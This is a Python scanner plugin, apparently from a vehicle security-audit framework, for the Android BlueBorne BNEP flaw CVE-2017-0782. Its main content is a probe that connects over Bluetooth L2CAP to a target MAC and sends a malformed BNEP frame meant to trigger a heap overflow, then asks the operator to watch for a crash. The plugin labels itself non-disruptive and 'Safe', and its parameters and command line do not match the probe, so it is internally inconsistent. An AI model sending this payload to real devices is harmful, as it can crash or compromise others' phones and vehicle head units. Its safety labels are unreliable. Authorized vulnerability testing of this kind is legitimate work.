#!/usr/bin/env python3
"""Active validation PoC for connected-vehicle vulnerability scanning."""
from __future__ import annotations

import socket
import struct
import subprocess

from active_validation_core import run_active_validation
from iv_plugin_base import IVIVulnerabilityPlugin


def _check_bt_adapter() -> dict:
    info = {"adapter_found": False, "hcitool_available": False}
    try:
        r = subprocess.run(["hcitool", "dev"], capture_output=True, text=True, timeout=5)
        info["hcitool_available"] = True
        for line in r.stdout.splitlines():
            if line.strip().startswith("hci"):
                info["adapter_found"] = True
                break
    except FileNotFoundError:
        info["error"] = "hcitool not found"
    except subprocess.TimeoutExpired:
        info["error"] = "timeout"
    return info


def _send_bnep_blueborne_probe(mac: str) -> dict:
    """
    CVE-2017-0782: Android BNEP BlueBorne RCE.
    The vulnerability lies in the BNEP (Bluetooth Network Encapsulation Protocol)
    SetupConnectionRequest handler. Sending a malformed type extension frame
    triggers a heap overflow in Android's BT stack (system_server or bluetoothtbd).
    PSM 0x000F = BNEP
    """
    result = {"connected": False, "bnep_response": "", "error": ""}
    try:
        AF_BLUETOOTH = getattr(socket, "AF_BLUETOOTH", 31)
        BTPROTO_L2CAP = getattr(socket, "BTPROTO_L2CAP", 0)
        sock = socket.socket(AF_BLUETOOTH, socket.SOCK_SEQPACKET, BTPROTO_L2CAP)
        sock.settimeout(8.0)
        bdaddr_bytes = bytes(int(b, 16) for b in reversed(mac.split(":")))
        addr = struct.pack("<H H 6s H B", AF_BLUETOOTH, 0x000F, bdaddr_bytes, 0, 0)
        sock.connect(addr)
        result["connected"] = True

        # BNEP SetupConnectionRequest with crafted UUID length mismatch
        # type=0x01 (BNEP_SETUP_CONNECTION_REQUEST_MSG), ext bit set, length overflow
        # This triggers the heap overflow in CVE-2017-0782
        bnep_type = 0x81  # type=0x01 | Extension bit (0x80)
        uuid_size = 0x01  # Claim 2-byte UUID size (1=2 bytes, 2=4 bytes, 3=16 bytes)
        # But send 16 extra bytes to overflow the UUID comparison buffer
        crafted = struct.pack(">B B", bnep_type, uuid_size) + b"\xAA" * 18
        sock.sendall(crafted)

        try:
            resp = sock.recv(1024)
            result["bnep_response"] = resp.hex()
        except socket.timeout:
            result["bnep_response"] = "timeout"

        sock.close()
    except OSError as exc:
        result["error"] = str(exc)
    except Exception as exc:
        result["error"] = str(exc)
    return result


def _run_poc(plugin) -> dict:
    params = plugin.params or {}
    bt_mac = params.get("bluetooth_mac") or params.get("bt_mac", "")

    evidence = {
        "cve": "CVE-2017-0782",
        "target": bt_mac or "Android device BT (BlueBorne BNEP RCE)",
        "technique": (
            "BlueBorne BNEP RCE: send malformed BNEP SetupConnectionRequest with "
            "crafted UUID length to trigger heap overflow in Android BT stack"
        ),
        "reference": "https://nvd.nist.gov/vuln/detail/CVE-2017-0782",
        "affected_versions": "Android < 2017-09-01 security patch",
        "impact": "Remote code execution without user interaction on Android device with BT enabled",
    }

    adapter_info = _check_bt_adapter()
    evidence["bt_adapter"] = adapter_info

    if not adapter_info["adapter_found"]:
        evidence["note"] = "No BT adapter; cannot probe BlueBorne BNEP RCE"
        return {"vulnerable": None, "evidence": evidence, "requires_manual_review": True}

    if not bt_mac:
        evidence["note"] = "bluetooth_mac parameter required"
        return {"vulnerable": None, "evidence": evidence, "requires_manual_review": True}

    bnep_result = _send_bnep_blueborne_probe(bt_mac)
    evidence["bnep_probe"] = bnep_result

    if bnep_result["connected"]:
        vulnerable = None
        evidence["note"] = (
            "BNEP connection established on PSM 0x000F; malformed frame sent. "
            "Check for target BT crash/restart to confirm CVE-2017-0782 exploitability."
        )
    else:
        vulnerable = None
        evidence["note"] = f"BNEP probe failed: {bnep_result.get('error')}. Target may not expose BNEP."

    return {
        "vulnerable": vulnerable,
        "evidence": evidence,
        "requires_manual_review": True,
    }


VULN = {
    "id": 68,
    "cve": "CVE-2017-0782",
    "year": 2017,
    "domain": "蓝牙/移动-车机互联",
    "vendor_product": "Android Bluetooth",
    "component": "Bluetooth stack",
    "type": "BlueBorne RCE",
    "summary": "BlueBorne蓝牙RCE，影响车载Android/手机投屏生态。",
    "source_description": "A remote code execution vulnerability in the Android system (bluetooth). Product: Android. Versions: 4.4.4, 5.0.2, 5.1.1, 6.0, 6.0.1, 7.0, 7.1.1, 7.1.2, 8.0. Android ID: A-63146237.",
    "poc_status": "有公开PoC/研究代码",
    "research_value": "作为智能网联汽车常见基础组件/无线协议/车载互联依赖的关联漏洞纳入。",
    "source_url": "https://nvd.nist.gov/vuln/detail/CVE-2017-0782",
    "references": [
        "https://nvd.nist.gov/vuln/detail/CVE-2017-0782",
        "http://www.oracle.com/technetwork/security-advisory/cpujan2018-3236628.html",
        "https://source.android.com/security/bulletin/2017-09-01",
        "http://www.securityfocus.com/bid/100822",
        "https://cveawg.mitre.org/api/cve/CVE-2017-0782"
    ],
    "affected": [
        {
            "vendor": "Google Inc.",
            "product": "Android",
            "versions": [
                {
                    "version": "4.4.4",
                    "status": "affected"
                }
,
                {
                    "version": "5.0.2",
                    "status": "affected"
                },
                {
                    "version": "5.1.1",
                    "status": "affected"
                },
                {
                    "version": "6.0",
                    "status": "affected"
                },
                {
                    "version": "6.0.1",
                    "status": "affected"
                },
                {
                    "version": "7.0",
                    "status": "affected"
                },
                {
                    "version": "7.1.1",
                    "status": "affected"
                },
                {
                    "version": "7.1.2",
                    "status": "affected"
                },
                {
                    "version": "8.0",
                    "status": "affected"
                }
            ]
        }
    ],
    "signature_tokens": [
        "CVE-2017-0782",
        "Android",
        "Bluetooth",
        "stack",
        "BlueBorne",
        "RCE",
        "remote",
        "code",
        "execution",
        "vulnerability",
        "system",
        "bluetooth",
        "A-63146237",
        "Google Inc"
    ]
}

# ── 硬件需求（HW_REQUIREMENTS） ────────────────────────────────────────
HW_REQUIREMENTS = {
    "hardware":   ['USB Bluetooth 适配器（CSR8510 / Qualcomm QCA9377）', '或内置 BlueZ 5.x 的 Linux 主机'],
    "connection": 'HCI（/dev/hci0）',
    "tools":      ['BlueZ ≥ 5.48', 'hcitool', 'l2ping'],
    "firmware":   'N/A（通过 BlueZ 内核模块直接操作）',
    "setup":      'hciconfig hci0 up && hcitool scan',
}



try:
    import sys as _sys; _sys.path.insert(0, __import__('pathlib').Path(__file__).parent.parent.as_posix())
    from probe_utils import detection_confidence as _dc
    _PROBE_UTILS = True
except ImportError:
    def _dc(level, evidence, **kw): return {'detection_confidence': {'level': level, 'evidence': evidence}}
    _PROBE_UTILS = False

class Poc53CVE20170782RCEBlueBorneAuditPlugin(IVIVulnerabilityPlugin):
    meta_display_id = 'XLSX-068'
    meta_poc_name = 'CVE-2017-0782 BlueBorne RCE Active Validation'
    meta_cve_id = 'CVE-2017-0782'
    meta_severity = 'Critical'
    meta_protocol = 'bluetooth'
    meta_target_os = ['android']
    meta_required_params = ['wireless_scan_text']
    meta_profiles = ['bluetooth']
    meta_source_url = 'https://nvd.nist.gov/vuln/detail/CVE-2017-0782'
    meta_references       = ['https://nvd.nist.gov/vuln/detail/CVE-2017-0782']
    meta_attack_surface = '无线/外设接口'
    is_disruptive = False
    meta_destructive_level = "Safe"

    def check_prerequisites(self):
        return True

    def exploit(self):
        return run_active_validation(self, VULN, probe=_run_poc)

if __name__ == "__main__":
    import argparse, json

    _desc = VULN.get("summary", "53_Android_BT_BlueBorne_RCE_Audit") if "VULN" in dir() else "53_Android_BT_BlueBorne_RCE_Audit"
    parser = argparse.ArgumentParser(description=_desc)
    parser.add_argument("target_ip", nargs="?", default="127.0.0.1",
                        help="目标 IP 地址")
    parser.add_argument("--port",       default=80, type=int)
    parser.add_argument("--disruptive", action="store_true",
                        help="启用破坏性探针（需操作员授权）")
    args = parser.parse_args()

    _plugin = Poc53CVE20170782RCEBlueBorneAuditPlugin({
        "target_ip":        args.target_ip,
        "port":             args.port,
        "allow_disruptive": args.disruptive,
    })
    _result = _plugin.run_verify()
    print(json.dumps(_result, indent=2, ensure_ascii=False, default=str))
